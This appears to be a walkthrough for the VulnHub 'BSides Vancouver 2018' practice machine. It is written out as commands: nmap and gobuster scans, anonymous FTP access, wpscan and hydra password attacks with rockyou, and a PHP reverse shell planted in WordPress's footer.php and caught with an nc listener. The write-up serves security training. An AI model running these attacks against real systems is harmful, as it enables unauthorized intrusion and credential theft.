# BSides Vancouver: 2018 (Workshop)

- **Machine:** BSides Vancouver: 2018 (Workshop)
- **Download:** https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

---

## Full Port Scan

Run a comprehensive Nmap scan to identify all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.172
```

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.172
```

```bash
nmap -sC -sV -A 192.168.2.172
```

---

## HTTP Enumeration

This command performs an aggressive scan and uses the `http-enum` NSE script to discover interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.172
```

---

# FTP Enumeration

## Anonymous FTP Login

Connect to the FTP server using anonymous authentication.

```bash
ftp 192.168.2.172
```

---

## Enumerate Files

List the available files.

```bash
ls
```

Navigate to the `public` directory.

```bash
cd public
```

Download the backup file.

```bash
get users.txt.bk
```

---

## Read the Downloaded File

```bash
cat users.txt.bk
```

### Users Discovered

```text
abatchy
john
mai
anne
doomguy
```

---

# Web Enumeration

Visit the following URLs:

- http://192.168.2.172
- http://192.168.2.172/robots.txt
- http://192.168.2.172/backup_wordpress/

---

## Directory Enumeration

Perform directory brute-force against the WordPress backup directory.

```bash
gobuster dir -u http://192.168.2.172/backup_wordpress/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
```

---

## WordPress Login Page

Visit:

- http://192.168.2.172/backup_wordpress/wp-admin/

A WordPress login page is discovered.

---

## WordPress Credential Attack (Lab)

> **Lab note:** The following password attack is performed only against the authorized VulnHub practice machine.

Attempt authentication testing for the `john` account.

```bash
wpscan --url http://192.168.2.172/backup_wordpress/ -U john -P /opt/rockyou.txt
```

Successful credentials:

```text
Username : john
Password : enigma
```

Login to the WordPress dashboard using the discovered credentials.

---

# Reverse Shell (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

Navigate to:

```text
Appearance → Editor → footer.php
```

---

## Start a Listener

```bash
nc -nlvp 443
```

---

## Trigger Reverse Shell

Insert a PHP reverse shell into `footer.php` and configure it to connect back to your attack machine.

> **Note:** Use a standard PHP reverse shell and update the IP address and listening port to match your attacking machine before saving the file.

---

## Trigger the Payload

Browse to:

```text
http://192.168.2.172/backup_wordpress/
```

A reverse shell is established on the listener.

---

# SSH Access

## Enumerate Available Users

The following usernames were discovered earlier:

```text
abatchy
john
mai
anne
doomguy
```

Attempt SSH authentication using the discovered usernames.

Only the **anne** account accepts password authentication.

---

## SSH Password Attack (Lab)

> **Lab note:** Perform password attacks only against systems you own or are explicitly authorized to test.

```bash
hydra -l anne -P /opt/rockyou.txt ssh://192.168.2.172
```

Credentials recovered:

```text
Username : anne
Password : princess
```

---

## SSH Login

```bash
ssh anne@192.168.2.172
```

Successful SSH access is obtained using the recovered credentials.

---

# Impact

- Anonymous FTP exposed sensitive backup files.
- Usernames were disclosed through an FTP backup.
- Weak WordPress credentials allowed administrative access.
- Administrative access enabled remote code execution through the theme editor.
- Weak SSH credentials resulted in authenticated shell access.

---

# Key Learning

- Always enumerate FTP services, especially anonymous access.
- Backup files frequently expose sensitive information.
- WordPress administrative access can lead to remote code execution.
- Credentials discovered in one service can often be reused against another.
- Multiple low-severity findings can combine into complete system compromise.

---

# Summary

The assessment began with anonymous FTP enumeration, which exposed a backup file containing valid usernames. Web enumeration identified a WordPress backup installation where weak credentials allowed administrative access. After obtaining administrator privileges, a PHP reverse shell was uploaded through the WordPress theme editor, resulting in remote code execution. Finally, password attacks against SSH revealed valid credentials for the `anne` account, providing interactive shell access to the target system.